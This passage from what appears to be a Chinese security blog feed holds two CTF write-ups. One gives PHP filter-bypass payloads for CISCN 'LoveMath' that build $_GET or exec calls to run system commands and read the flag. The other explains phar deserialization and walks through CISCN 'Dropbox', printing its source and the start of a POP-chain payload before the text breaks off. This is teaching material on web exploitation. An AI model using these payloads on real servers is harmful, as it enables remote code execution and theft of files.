_GET</code></li><li>选用<code>pi</code>的原因是因为题目有长度限制，白名单中最短的就是这两个字符<code>pi</code>，故选它</li><li>当<code>$pi</code>=<code>_GET</code>之后再在前面加一个<code>$</code>就形成了<code>$_GET</code></li><li><code>($$pi)&#123;1&#125;(($$pi)&#123;2&#125;)</code>翻译过来就是<code>($_GET)&#123;1&#125;(($_GET)&#123;2&#125;) === $_GET[1]($_GET[2])</code>，传入<code>1=system</code>即可进行命令执行</li></ul><p>举一反三，那么我们改如何构造出这种方法呢？<code>base_convert</code>的进制转换不知道的话又怎么知道该传入什么数字和进制呢？于是写出构造脚本：</p><p><code>base_convert</code>函数构造：</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php$a &#x3D; &#39;hex2bin&#39;;for($i &#x3D; 2; $i &lt; 37; $i++)&#123;    for($j &#x3D; 2; $j &lt; 37; $j++)&#123;        if(is_numeric(base_convert($a, $i, $j)))&#123;            if(base_convert(base_convert($a, $i, $j), $j, $i) &#x3D;&#x3D;&#x3D; $a)&#123;                echo &#39;len&#x3D;&#39;.strlen(base_convert($a, $i, $j)).&#39; &#39;.&#39;base_convert参数-&gt;&#39;.base_convert($a, $i, $j).&#39; &#39;.$j.&#39; &#39;.$i.&#39; &#39;.&quot;\n&quot;;            &#125;        &#125;    &#125;&#125;?&gt;</code></pre><p>这样即可得到所有的进制转换结果，当然如果题目没有引号限制，<code>is_numeric</code>函数也可以去掉，在里面选取所需要的即可</p><p>那么<code>dechex</code>如何构造呢？这个就简单了，两行代码就可以搞定</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php$a &#x3D; &quot;_GET&quot;;$num &#x3D; hexdec(bin2hex($a));echo $num . &quot;\n&quot;;echo (base_convert(3761671484,13,36)(dechex($num)));?&gt;</code></pre><p>输出的结果既是可传入的值</p><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><pre class="language-php" data-language="php"><code class="language-php">?c&#x3D;$pi&#x3D;base_convert,$pi(47138,20,36)($pi(8768397090111664438,10,30)()&#123;1&#125;)</code></pre><p>分析：</p><ul><li><code>base_convert(47138,20,36)  ==&gt;  exec</code>，exec执行一个外部程序，返回最后一行内容</li><li><code>base_convert(8768397090111664438,10,30)  ==&gt;   getallheaders</code>，获取全部 HTTP 请求头信息</li><li>以上语句翻译下来就是<code>exec(getallheaders()&#123;1&#125;)</code>，可以获取请求头第一个字段的值，<code>[]</code>被waf可以用<code>&#123;&#125;</code>包囊数字来解决代替绕过中括号和引号</li></ul><p>发包即可拿到flag</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/CISCN-LoveMath-php%E5%8A%A8%E6%80%81%E5%87%BD%E6%95%B0%E6%89%A7%E8%A1%8C/image-20200517213809635.png" alt loading="lazy"></p><p>当然这里直接<code>cat flag</code>也是可以的，如下：</p><pre class="language-php" data-language="php"><code class="language-php">?c&#x3D;($pi&#x3D;base_convert)(47138,20,36)($pi(3761671484,13,36)(dechex(109270211243818)))</code></pre><p>命令执行就是<code>exec(&quot;cat /*&quot;)</code>，可以打印出flag</p><h3 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h3><p>利用异或将字符串转化成我们想要的字符串，例如我们需要<code>$_GET</code>，那么就要获得<code>_GET</code>，FUZZ代码如下：</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php$payload &#x3D; [&#39;abs&#39;, &#39;acos&#39;, &#39;acosh&#39;, &#39;asin&#39;, &#39;asinh&#39;, &#39;atan2&#39;, &#39;atan&#39;, &#39;atanh&#39;,  &#39;bindec&#39;, &#39;ceil&#39;, &#39;cos&#39;, &#39;cosh&#39;, &#39;decbin&#39; , &#39;decoct&#39;, &#39;deg2rad&#39;, &#39;exp&#39;, &#39;expm1&#39;, &#39;floor&#39;, &#39;fmod&#39;, &#39;getrandmax&#39;, &#39;hexdec&#39;, &#39;hypot&#39;, &#39;is_finite&#39;, &#39;is_infinite&#39;, &#39;is_nan&#39;, &#39;lcg_value&#39;, &#39;log10&#39;, &#39;log1p&#39;, &#39;log&#39;, &#39;max&#39;, &#39;min&#39;, &#39;mt_getrandmax&#39;, &#39;mt_rand&#39;, &#39;mt_srand&#39;, &#39;octdec&#39;, &#39;pi&#39;, &#39;pow&#39;, &#39;rad2deg&#39;, &#39;rand&#39;, &#39;round&#39;, &#39;sin&#39;, &#39;sinh&#39;, &#39;sqrt&#39;, &#39;srand&#39;, &#39;tan&#39;, &#39;tanh&#39;];for($k&#x3D;1;$k&lt;&#x3D;sizeof($payload);$k++)&#123;    for($i &#x3D; 0;$i &lt; 9; $i++)&#123;        for($j &#x3D; 0;$j &lt;&#x3D;9; $j++)&#123;            $exp &#x3D; $payload[$k] ^ ($i.$j);            echo($payload[$k].&quot;^$i$j&quot;.&quot;&#x3D;&#x3D;&gt;$exp&quot;.&quot;\n&quot;);        &#125;    &#125;&#125;</code></pre><p>在打印出的结果中搜寻想要的字符串，找到最短的再组合</p><pre class="language-php" data-language="php"><code class="language-php">?c&#x3D;$pi&#x3D;(is_nan^(6).(4)).(tan^(1).(5));$pi&#x3D;$$pi;$pi&#123;0&#125;($pi&#123;1&#125;)&amp;0&#x3D;system&amp;1&#x3D;cat &#x2F;flag</code></pre><ul><li><code>is_nan^(6).(4)  ==&gt;  _G</code></li><li><code>tan^(1).(5)  ==&gt;  ET</code></li><li>以上就和第一种方法类似，然后在传命令执行的代码就可以了</li></ul><p>参考：</p><ul><li><a href="https://www.cnblogs.com/20175211lyz/p/11588219.html">https://www.cnblogs.com/20175211lyz/p/11588219.html</a></li><li><a href="https://www.cnblogs.com/wangtanzhi/p/12246731.html">https://www.cnblogs.com/wangtanzhi/p/12246731.html</a></li></ul><p>题目还是挺有意思的，如果再发现新方法再补上</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF题 </tag>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Phar反序列化浅析</title>
      <link href="/posts/bb56c28a/"/>
      <url>/posts/bb56c28a/</url>
      
        <content type="html"><![CDATA[<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="https://xz.aliyun.com/t/2958#toc-2">Phar与Stream Wrapper造成PHP RCE的深入挖掘</a></li><li><a href="https://www.freebuf.com/articles/web/205943.html">PHAR反序列化拓展操作总结</a></li><li><a href="https://paper.seebug.org/680/">利用 phar 拓展 php 反序列化漏洞攻击面</a></li></ul><a id="more"></a><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><h4 id="phar文件结构"><a href="#phar文件结构" class="headerlink" title="phar文件结构"></a>phar文件结构</h4><p><strong>①</strong>  <strong>a stub</strong></p><p>可以理解为一个标志，格式为<code>xxx</code>，前面内容不限，但必须以<code>__HALT_COMPILER();?&gt;</code>来结尾，否则phar扩展将无法识别这个文件为phar文件。</p><p><strong>②</strong>  <strong>a manifest describing the contents</strong></p><p>phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以<strong>序列化</strong>的形式存储用户自定义的<code>meta-data</code>，这是上述攻击手法最核心的地方。</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/image-20200504124151781.png" alt loading="lazy"></p><p><strong>③</strong>  <strong>the file contents</strong></p><p>被压缩文件的内容。</p><p><strong>④</strong>  <strong>a signature for verifying Phar integrity (phar file format only)</strong></p><p>签名，放在文件末尾，格式如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/image-20200504124231445.png" alt loading="lazy"></p><p>通过<code>phar://</code>伪协议对一个<strong>phar</strong>文件进行了文件操作的时候，就可以触发反序列化，达到<strong>RCE</strong>的效果</p><h4 id="产生缘由"><a href="#产生缘由" class="headerlink" title="产生缘由"></a>产生缘由</h4><p>在<a href="https://github.com/php/php-src/blob/29b56a878aa22310d645c3266110417e07ebe683/ext/phar/phar.c#L618">phar.c#L618</a>处，其调用了<code>php_var_unserialize</code></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/image-20200504120955832.png" alt loading="lazy"></p><p>因此可以构造一个特殊的phar包，使得代码能够反序列化，从而构造一个pop链，在使用<code>phar://</code>协议读取文件的时候，文件会被解析成phar (<a href="https://www.php.net/manual/zh/intro.phar.php">https://www.php.net/manual/zh/intro.phar.php</a>) 的过程会触发<code>php_var_unserialize</code>函数对<strong>meta-data</strong>的操作，造成反序列化。</p><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p><strong>条件</strong></p><ul><li>phar文件要能够上传到服务器端。</li><li>要有可用的魔术方法作为“跳板”。</li><li>文件操作函数的参数可控，且<code>:</code>、<code>/</code>、<code>phar</code>等特殊字符没有被过滤。</li></ul><p>有序列化数据必然会有反序列化操作，php一大部分的<a href="http://php.net/manual/en/ref.filesystem.php">文件系统函数</a>在通过<code>phar://</code>伪协议解析phar文件时，都会将meta-data进行反序列化，测试后受影响的函数如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/image-20200504120506980.png" alt loading="lazy"></p><ul><li><strong>exif</strong>：<code>exif_thumbnail</code>，<code>exif_imagetype</code></li><li><strong>gd</strong>：<code>imageloadfont</code>，<code>imagecreatefrom***</code></li><li><strong>hash</strong>：<code>hash_hmac_file</code>，<code>hash_file</code>，<code>hash_update_file</code>，<code>md5_file</code>，<code>sha1_file</code></li><li><strong>file/url</strong>：<code>get_meta_tags</code>，<code>get_headers</code></li><li><strong>standard</strong>：<code>getimagesize</code>，<code>getimagesizefromstring</code></li></ul><p><strong>zip</strong>：</p><pre class="language-php" data-language="php"><code class="language-php">$zip &#x3D; new ZipArchive();$res &#x3D; $zip-&gt;open(&#39;c.zip&#39;);$zip-&gt;extractTo(&#39;phar:&#x2F;&#x2F;test.phar&#x2F;test&#39;);</code></pre><p>限制<code>phar://</code>不能出现在头几个字符，亦适用于<code>compress.zlib://</code>：</p><pre class="language-php" data-language="php"><code class="language-php">$z &#x3D; &#39;compress.bzip2:&#x2F;&#x2F;phar:&#x2F;&#x2F;&#x2F;home&#x2F;sx&#x2F;test.phar&#x2F;test.txt&#39;;</code></pre><p><strong><a href="https://baike.baidu.com/item/PostgreSQL/530240?fr=aladdin">PostgreSQL</a></strong>：</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php$pdo &#x3D; new PDO(sprintf(&quot;pgsql:host&#x3D;%s;dbname&#x3D;%s;user&#x3D;%s;password&#x3D;%s&quot;, &quot;127.0.0.1&quot;, &quot;postgres&quot;, &quot;sx&quot;, &quot;123456&quot;));@$pdo-&gt;pgsqlCopyFromFile(&#39;aa&#39;, &#39;phar:&#x2F;&#x2F;test.phar&#x2F;aa&#39;);</code></pre><p><code>pgsqlCopyToFile</code>和<code>pg_trace</code>同样能使用的，需要开启<code>phar</code>的写功能。</p><h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>生成<strong>phar</strong>文件：</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php    class TestObject &#123;    &#125;    @unlink(&quot;phar.phar&quot;);    $phar &#x3D; new Phar(&quot;phar.phar&quot;); &#x2F;&#x2F;后缀名必须为phar    $phar-&gt;startBuffering();    $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); &#x2F;&#x2F;设置stub    $o &#x3D; new TestObject();    $phar-&gt;setMetadata($o); &#x2F;&#x2F;将自定义的meta-data存入manifest    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); &#x2F;&#x2F;添加要压缩的文件    &#x2F;&#x2F;签名自动计算    $phar-&gt;stopBuffering();?&gt;</code></pre><p>notepad打开查看：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/image-20200504131930692.png" alt loading="lazy"></p><p>明显的序列化存储</p><p>构造利用代码</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php     class TestObject &#123;        public function __destruct() &#123;            echo &#39;Destruct called&#39;;        &#125;    &#125;    $filename &#x3D; &#39;phar:&#x2F;&#x2F;phar.phar&#x2F;a_random_string&#39;;    file_exists($filename);?&gt;</code></pre><p>成功打印结果，当然这里换其他的文件操作函数也可以</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/image-20200504132140672.png" alt loading="lazy"></p><p><strong>将phar伪造成其他格式的文件</strong></p><p>在前面分析phar的文件结构时可能会注意到，php识别phar文件是通过其文件头的stub，更确切一点来说是<code>__HALT_COMPILER();?&gt;</code>这段代码，对前面的内容或者后缀名是没有要求的。那么我们就可以通过添加任意的文件头+修改后缀名的方式将phar文件伪装成其他格式的文件。</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php    class TestObject &#123;    &#125;    @unlink(&quot;phar.phar&quot;);    $phar &#x3D; new Phar(&quot;phar.phar&quot;);    $phar-&gt;startBuffering();    $phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); &#x2F;&#x2F;设置stub，增加gif文件头    $o &#x3D; new TestObject();    $phar-&gt;setMetadata($o); &#x2F;&#x2F;将自定义meta-data存入manifest    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); &#x2F;&#x2F;添加要压缩的文件    &#x2F;&#x2F;签名自动计算    $phar-&gt;stopBuffering();?&gt;</code></pre><p>notepad打开查看：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/image-20200504132602458.png" alt loading="lazy"></p><p>和上面的一样可以利用成功</p><h3 id="栗子"><a href="#栗子" class="headerlink" title="栗子"></a>栗子</h3><h4 id="CISCN2019-华北赛区-Day1-Web1-—Dropbox"><a href="#CISCN2019-华北赛区-Day1-Web1-—Dropbox" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web1]—Dropbox"></a>[CISCN2019 华北赛区 Day1 Web1]—Dropbox</h4><p>界面：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/image-20200504212154616.png" alt loading="lazy"></p><p>先随便注册一个账号登录，随后发现有上传文件和下载，删除文件的功能</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/image-20200504212308364.png" alt loading="lazy"></p><p>测试文件上传，只能上传那三种图片的格式，应该是有白名单，且文件上传后路径不可知，于是抓包测试文件下载和删除功能，其中文件下载处存在文件下载漏洞，于是将整个网站的源码都下载下来，测试后发现，后台在下载界面还是做了权限限制的，不然根目录下的<code>flag</code>就可以直接下下来了</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/image-20200504212700778.png" alt loading="lazy"></p><p>有以下文件：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/image-20200504213252372.png" alt loading="lazy"></p><p>login.php</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpsession_start();if (isset($_SESSION[&#39;login&#39;])) &#123;    header(&quot;Location: index.php&quot;);    die();&#125;?&gt;.........(HTML)&lt;?phpinclude &quot;class.php&quot;;if (isset($_GET[&#39;register&#39;])) &#123;    echo &quot;&lt;script&gt;toast(&#39;注册成功&#39;, &#39;info&#39;);&lt;&#x2F;script&gt;&quot;;&#125;if (isset($_POST[&quot;username&quot;]) &amp;&amp; isset($_POST[&quot;password&quot;])) &#123;    $u &#x3D; new User();    $username &#x3D; (string) $_POST[&quot;username&quot;];    $password &#x3D; (string) $_POST[&quot;password&quot;];    if (strlen($username) &lt; 20 &amp;&amp; $u-&gt;verify_user($username, $password)) &#123;        $_SESSION[&#39;login&#39;] &#x3D; true;        $_SESSION[&#39;username&#39;] &#x3D; htmlentities($username);        $sandbox &#x3D; &quot;uploads&#x2F;&quot; . sha1($_SESSION[&#39;username&#39;] . &quot;sftUahRiTz&quot;) . &quot;&#x2F;&quot;;        if (!is_dir($sandbox)) &#123;            mkdir($sandbox);        &#125;        $_SESSION[&#39;sandbox&#39;] &#x3D; $sandbox;        echo(&quot;&lt;script&gt;window.location.href&#x3D;&#39;index.php&#39;;&lt;&#x2F;script&gt;&quot;);        die();    &#125;    echo &quot;&lt;script&gt;toast(&#39;账号或密码错误&#39;, &#39;warning&#39;);&lt;&#x2F;script&gt;&quot;;&#125;?&gt;</code></pre><p>register.php</p><pre class="language-php" data-language="php"><code class="language-php">.........(HTML)&lt;?phpinclude &quot;class.php&quot;;if (isset($_POST[&quot;username&quot;]) &amp;&amp; isset($_POST[&quot;password&quot;])) &#123;    $u &#x3D; new User();    $username &#x3D; (string) $_POST[&quot;username&quot;];    $password &#x3D; (string) $_POST[&quot;password&quot;];    if (strlen($username) &lt; 20 &amp;&amp; strlen($username) &gt; 2 &amp;&amp; strlen($password) &gt; 1) &#123;        if ($u-&gt;add_user($username, $password)) &#123;            echo(&quot;&lt;script&gt;window.location.href&#x3D;&#39;login.php?register&#39;;&lt;&#x2F;script&gt;&quot;);            die();        &#125; else &#123;            echo &quot;&lt;script&gt;toast(&#39;此用户名已被使用&#39;, &#39;warning&#39;);&lt;&#x2F;script&gt;&quot;;            die();        &#125;    &#125;    echo &quot;&lt;script&gt;toast(&#39;请输入有效用户名和密码&#39;, &#39;warning&#39;);&lt;&#x2F;script&gt;&quot;;&#125;?&gt;</code></pre><p>upload.php</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpsession_start();if (!isset($_SESSION[&#39;login&#39;])) &#123;    header(&quot;Location: login.php&quot;);    die();&#125;include &quot;class.php&quot;;if (isset($_FILES[&quot;file&quot;])) &#123;    $filename &#x3D; $_FILES[&quot;file&quot;][&quot;name&quot;];    $pos &#x3D; strrpos($filename, &quot;.&quot;);    if ($pos !&#x3D;&#x3D; false) &#123;        $filename &#x3D; substr($filename, 0, $pos);    &#125;    $fileext &#x3D; &quot;.gif&quot;;    switch ($_FILES[&quot;file&quot;][&quot;type&quot;]) &#123;        case &#39;image&#x2F;gif&#39;:            $fileext &#x3D; &quot;.gif&quot;;            break;        case &#39;image&#x2F;jpeg&#39;:            $fileext &#x3D; &quot;.jpg&quot;;            break;        case &#39;image&#x2F;png&#39;:            $fileext &#x3D; &quot;.png&quot;;            break;        default:            $response &#x3D; array(&quot;success&quot; &#x3D;&gt; false, &quot;error&quot; &#x3D;&gt; &quot;Only gif&#x2F;jpg&#x2F;png allowed&quot;);            Header(&quot;Content-type: application&#x2F;json&quot;);            echo json_encode($response);            die();    &#125;    if (strlen($filename) &lt; 40 &amp;&amp; strlen($filename) !&#x3D;&#x3D; 0) &#123;        $dst &#x3D; $_SESSION[&#39;sandbox&#39;] . $filename . $fileext;        move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], $dst);        $response &#x3D; array(&quot;success&quot; &#x3D;&gt; true, &quot;error&quot; &#x3D;&gt; &quot;&quot;);        Header(&quot;Content-type: application&#x2F;json&quot;);        echo json_encode($response);    &#125; else &#123;        $response &#x3D; array(&quot;success&quot; &#x3D;&gt; false, &quot;error&quot; &#x3D;&gt; &quot;Invaild filename&quot;);        Header(&quot;Content-type: application&#x2F;json&quot;);        echo json_encode($response);    &#125;&#125;?&gt;</code></pre><p>download.php</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpsession_start();if (!isset($_SESSION[&#39;login&#39;])) &#123;    header(&quot;Location: login.php&quot;);    die();&#125;if (!isset($_POST[&#39;filename&#39;])) &#123;    die();&#125;include &quot;class.php&quot;;ini_set(&quot;open_basedir&quot;, getcwd() . &quot;:&#x2F;etc:&#x2F;tmp&quot;);chdir($_SESSION[&#39;sandbox&#39;]);$file &#x3D; new File();$filename &#x3D; (string) $_POST[&#39;filename&#39;];if (strlen($filename) &lt; 40 &amp;&amp; $file-&gt;open($filename) &amp;&amp; stristr($filename, &quot;flag&quot;) &#x3D;&#x3D;&#x3D; false) &#123;    Header(&quot;Content-type: application&#x2F;octet-stream&quot;);    Header(&quot;Content-Disposition: attachment; filename&#x3D;&quot; . basename($filename));    echo $file-&gt;close();&#125; else &#123;    echo &quot;File not exist&quot;;&#125;?&gt;</code></pre><p>delete.php</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpsession_start();if (!isset($_SESSION[&#39;login&#39;])) &#123;    header(&quot;Location: login.php&quot;);    die();&#125;if (!isset($_POST[&#39;filename&#39;])) &#123;    die();&#125;include &quot;class.php&quot;;chdir($_SESSION[&#39;sandbox&#39;]);$file &#x3D; new File();$filename &#x3D; (string) $_POST[&#39;filename&#39;];if (strlen($filename) &lt; 40 &amp;&amp; $file-&gt;open($filename)) &#123;    $file-&gt;detele();    Header(&quot;Content-type: application&#x2F;json&quot;);    $response &#x3D; array(&quot;success&quot; &#x3D;&gt; true, &quot;error&quot; &#x3D;&gt; &quot;&quot;);    echo json_encode($response);&#125; else &#123;    Header(&quot;Content-type: application&#x2F;json&quot;);    $response &#x3D; array(&quot;success&quot; &#x3D;&gt; false, &quot;error&quot; &#x3D;&gt; &quot;File not exist&quot;);    echo json_encode($response);&#125;?&gt;</code></pre><p>class.php</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phperror_reporting(0);$dbaddr &#x3D; &quot;127.0.0.1&quot;;$dbuser &#x3D; &quot;root&quot;;$dbpass &#x3D; &quot;root&quot;;$dbname &#x3D; &quot;dropbox&quot;;$db &#x3D; new mysqli($dbaddr, $dbuser, $dbpass, $dbname);class User &#123;    public $db;    public function __construct() &#123;        global $db;        $this-&gt;db &#x3D; $db;    &#125;    public function user_exist($username) &#123;        $stmt &#x3D; $this-&gt;db-&gt;prepare(&quot;SELECT &#96;username&#96; FROM &#96;users&#96; WHERE &#96;username&#96; &#x3D; ? LIMIT 1;&quot;);        $stmt-&gt;bind_param(&quot;s&quot;, $username);        $stmt-&gt;execute();        $stmt-&gt;store_result();        $count &#x3D; $stmt-&gt;num_rows;        if ($count &#x3D;&#x3D;&#x3D; 0) &#123;            return false;        &#125;        return true;    &#125;    public function add_user($username, $password) &#123;        if ($this-&gt;user_exist($username)) &#123;            return false;        &#125;        $password &#x3D; sha1($password . &quot;SiAchGHmFx&quot;);        $stmt &#x3D; $this-&gt;db-&gt;prepare(&quot;INSERT INTO &#96;users&#96; (&#96;id&#96;, &#96;username&#96;, &#96;password&#96;) VALUES (NULL, ?, ?);&quot;);        $stmt-&gt;bind_param(&quot;ss&quot;, $username, $password);        $stmt-&gt;execute();        return true;    &#125;    public function verify_user($username, $password) &#123;        if (!$this-&gt;user_exist($username)) &#123;            return false;        &#125;        $password &#x3D; sha1($password . &quot;SiAchGHmFx&quot;);        $stmt &#x3D; $this-&gt;db-&gt;prepare(&quot;SELECT &#96;password&#96; FROM &#96;users&#96; WHERE &#96;username&#96; &#x3D; ?;&quot;);        $stmt-&gt;bind_param(&quot;s&quot;, $username);        $stmt-&gt;execute();        $stmt-&gt;bind_result($expect);        $stmt-&gt;fetch();        if (isset($expect) &amp;&amp; $expect &#x3D;&#x3D;&#x3D; $password) &#123;            return true;        &#125;        return false;    &#125;    public function __destruct() &#123;        $this-&gt;db-&gt;close();    &#125;&#125;class FileList &#123;    private $files;    private $results;    private $funcs;    public function __construct($path) &#123;        $this-&gt;files &#x3D; array();        $this-&gt;results &#x3D; array();        $this-&gt;funcs &#x3D; array();        $filenames &#x3D; scandir($path);        $key &#x3D; array_search(&quot;.&quot;, $filenames);        unset($filenames[$key]);        $key &#x3D; array_search(&quot;..&quot;, $filenames);        unset($filenames[$key]);        foreach ($filenames as $filename) &#123;            $file &#x3D; new File();            $file-&gt;open($path . $filename);            array_push($this-&gt;files, $file);            $this-&gt;results[$file-&gt;name()] &#x3D; array();        &#125;    &#125;    public function __call($func, $args) &#123;        array_push($this-&gt;funcs, $func);        foreach ($this-&gt;files as $file) &#123;            $this-&gt;results[$file-&gt;name()][$func] &#x3D; $file-&gt;$func();        &#125;    &#125;    public function __destruct() &#123;        $table &#x3D; &#39;&lt;div id&#x3D;&quot;container&quot; class&#x3D;&quot;container&quot;&gt;&lt;div class&#x3D;&quot;table-responsive&quot;&gt;&lt;table id&#x3D;&quot;table&quot; class&#x3D;&quot;table table-bordered table-hover sm-font&quot;&gt;&#39;;        $table .&#x3D; &#39;&lt;thead&gt;&lt;tr&gt;&#39;;        foreach ($this-&gt;funcs as $func) &#123;            $table .&#x3D; &#39;&lt;th scope&#x3D;&quot;col&quot; class&#x3D;&quot;text-center&quot;&gt;&#39; . htmlentities($func) . &#39;&lt;&#x2F;th&gt;&#39;;        &#125;        $table .&#x3D; &#39;&lt;th scope&#x3D;&quot;col&quot; class&#x3D;&quot;text-center&quot;&gt;Opt&lt;&#x2F;th&gt;&#39;;        $table .&#x3D; &#39;&lt;&#x2F;thead&gt;&lt;tbody&gt;&#39;;        foreach ($this-&gt;results as $filename &#x3D;&gt; $result) &#123;            $table .&#x3D; &#39;&lt;tr&gt;&#39;;            foreach ($result as $func &#x3D;&gt; $value) &#123;                $table .&#x3D; &#39;&lt;td class&#x3D;&quot;text-center&quot;&gt;&#39; . htmlentities($value) . &#39;&lt;&#x2F;td&gt;&#39;;            &#125;            $table .&#x3D; &#39;&lt;td class&#x3D;&quot;text-center&quot; filename&#x3D;&quot;&#39; . htmlentities($filename) . &#39;&quot;&gt;&lt;a href&#x3D;&quot;#&quot; class&#x3D;&quot;download&quot;&gt;下载&lt;&#x2F;a&gt; &#x2F; &lt;a href&#x3D;&quot;#&quot; class&#x3D;&quot;delete&quot;&gt;删除&lt;&#x2F;a&gt;&lt;&#x2F;td&gt;&#39;;            $table .&#x3D; &#39;&lt;&#x2F;tr&gt;&#39;;        &#125;        echo $table;    &#125;&#125;class File &#123;    public $filename;    public function open($filename) &#123;        $this-&gt;filename &#x3D; $filename;        if (file_exists($filename) &amp;&amp; !is_dir($filename)) &#123;            return true;        &#125; else &#123;            return false;        &#125;    &#125;    public function name() &#123;        return basename($this-&gt;filename);    &#125;    public function size() &#123;        $size &#x3D; filesize($this-&gt;filename);        $units &#x3D; array(&#39; B&#39;, &#39; KB&#39;, &#39; MB&#39;, &#39; GB&#39;, &#39; TB&#39;);        for ($i &#x3D; 0; $size &gt;&#x3D; 1024 &amp;&amp; $i &lt; 4; $i++) $size &#x2F;&#x3D; 1024;        return round($size, 2).$units[$i];    &#125;    public function detele() &#123;        unlink($this-&gt;filename);    &#125;    public function close() &#123;        return file_get_contents($this-&gt;filename);    &#125;&#125;?&gt;</code></pre><p>代码核心就在<code>class.php</code>了</p><p>先看到login和register两个文件，用了PDO，注入相当困难，找到到文件下载功能<code>download</code>，可以看到这样的一句代码：<code>ini_set(&quot;open_basedir&quot;, getcwd() . &quot;:/etc:/tmp&quot;);</code></p><p><strong>ini_set</strong>：出为一个配置选项设置值，可以设置php的一些配置，其中就包括<strong>open_basedir</strong>，用来限制当前程序可以访问的目录。当前设置为<code>getcwd()</code>当前目录和<code>/etc</code>和<code>/tmp</code>三个目录，这就是为什么前面下载不了根目录下的<code>flag</code>了</p><p>再看到<code>delete.php</code>文件，并没有限制，于是我们寻找可利用条件，重点看到<code>class.php</code>，在这个文件的<code>File</code>类中发现了<code>close()</code>方法中有一个<code>file_get_contents</code>方法，明显的文件读取，再找到使用了这个函数的方法，不难发现在<code>User</code>类中的<code>__destruct</code>方法调用了这个函数，<code>__destruct</code>方法是当一个对象被销毁的时候才调用，delete.php中就可以触发这方法，但是这也要这些类中的属性我们可控才能调用这些方法，于是这里就引出了<code>phar</code>伪协议反序列化的操作，详见上面的说明</p><p>于是初步构造payload：</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpclass User &#123;    public $db;&#125;class File &#123;    public $filename;    public function __construct()    &#123;        $this-&gt;filename&#x3D;&#39;&#x2F;flag.txt&#39;;    &#125;&#125;$a &#x3D; new User();$a-&gt;db &#x3D; new File();?&gt;</code></pre><p>但是在<code>file_get_contents</code>后我们并没有回显的函数，于是就需要用到<code>FileList</code>类中的<code>__destruct</code>方法来回显，这里就需要再创建一个<code>FileList</code>类，令其中的<code>files</code>为<code>new File()</code>，但是这里就创建了两个类了，无法达到反序列化的效果，那么我们再来看看如何把这三个类给联系起来，可以看到<code>FileList</code>类中的<code>__call</code>方法，（ 当对象调用一个不存在的方法的时候调用，<strong>$func</strong>：被调用的方法名，<strong>$args</strong> ： 被调用方法中的参数，这是个数组），再看到上面的<code>User的</code>的<code>__destruct</code>方法，如果我们令<code>User</code>类中的<code>db</code>属性为<code>FileList</code>类，调用其中不存在的<code>close</code>方法，就可以完美触发<code>FileList</code>类中的<code>__call</code>方法，再看到<code>__call</code>方法的实现：</p><pre class="language-php" data-language="php"><code class="language-php">public function __call($func, $args) &#123;    array_push($this-&gt;funcs, $func);    foreach ($this-&gt;files as $file) &#123;        $this-&gt;results[$file-&gt;name()][$func] &#x3D; 